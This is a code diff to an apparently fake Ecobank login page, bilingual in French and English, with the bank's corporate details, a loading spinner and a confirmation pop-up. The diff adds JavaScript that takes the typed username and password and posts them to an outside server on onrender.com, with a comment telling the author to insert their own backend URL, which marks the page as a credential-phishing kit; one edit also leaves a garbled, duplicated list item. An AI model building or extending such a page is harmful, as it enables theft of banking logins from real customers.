@@ -72,7 +72,7 @@ footer a:hover { color:#fff; text-decoration: underline; }
 
 #loader-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.15); backdrop-filter: blur(3px); z-index:9998; align-items:center; justify-content:center; }
 #loader-overlay .spinner { width:60px; height:60px; border:6px solid rgba(2,98,159,0.2); border-top:6px solid #02629f; border-radius:50%; animation: spin 1s linear infinite; }
-@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 
 #confirm-window { display:none; position:fixed; top:50%; left:50%; transform: translate(-50%, -50%) scale(0.8); width:380px; max-width:90%; background:#fff; border-radius:20px; box-shadow:0 15px 50px rgba(0,0,0,0.3); padding:25px 20px; z-index:9999; text-align:center; transition: all 0.4s ease; }
 #confirm-window.show { transform: translate(-50%, -50%) scale(1); opacity:1; }
@@ -212,7 +212,8 @@ footer a:hover { color:#fff; text-decoration: underline; }
     <ul>
         <li data-fr="Dénomination sociale : Ecobank Transnational Incorporated (ETI)" data-en="Company name: Ecobank Transnational Incorporated (ETI)">Dénomination sociale : Ecobank Transnational Incorporated (ETI)</li>
         <li data-fr="Capital autorisé : 1 276 664 511,95 dollars" data-en="Authorized capital: 1,276,664,511.95 dollars">Capital autorisé : 1 276 664 511,95 dollars</li>
-        <li data-fr="Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)" data-en="Registration number: 1986 B 1575 (May 2, 1986, Lome, Togo)">Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)</li>
+        <li data-fr="Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)" data-en="Registration number: 1986 B 1575 (May 2, 1986, Lome, Togo)">Numéro d’immatriculation : 1986 B 1575 (
+(2 mai 1986, Lomé, Togo)">Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)</li>
         <li data-fr="Siège social : 2365, Boulevard du Mono - BP : 3261 Lomé, Togo" data-en="Head office: 2365, Boulevard du Mono - BP: 3261 Lome, Togo">Siège social : 2365, Boulevard du Mono - BP : 3261 Lomé, Togo</li>
         <li data-fr="Tél. : +228 22 21 03 03 / +228 22 21 31 68" data-en="Tel: +228 22 21 03 03 / +228 22 21 31 68">Tél. : +228 22 21 03 03 / +228 22 21 31 68</li>
         <li data-fr="Courriel : info@ecobank.com" data-en="Email: info@ecobank.com">Courriel : info@ecobank.com</li>
@@ -305,12 +306,37 @@ loginBtn.addEventListener("click", (e) => {
     mainContent.classList.add("blur");
     footer.classList.add("blur");
     loaderOverlay.style.display = "flex";
-    setTimeout(() => {
+
+    // Appel au backend
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    fetch("https://ton-backend.onrender.com/login", {  // <-- Remplace par l’URL de ton backend Render
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+    })
+    .then(res => res.json())
+    .then(data => {
         loaderOverlay.style.display = "none";
-        confirmWindow.style.display = "block";
-        confirmWindow.classList.add("show");
-    }, 2000);
+        if(data.success){
+            confirmWindow.style.display = "block";
+            confirmWindow.classList.add("show");
+        } else {
+            alert("Identifiants incorrects !");
+            mainContent.classList.remove("blur");
+            footer.classList.remove("blur");
+        }
+    })
+    .catch(err => {
+        loaderOverlay.style.display = "none";
+        alert("Erreur serveur, réessayez plus tard.");
+        mainContent.classList.remove("blur");
+        footer.classList.remove("blur");
+        console.error(err);
+    });
 });
+
 closeConfirm.addEventListener("click", () => {
     confirmWindow.style.display = "none";
     mainContent.classList.remove("blur");
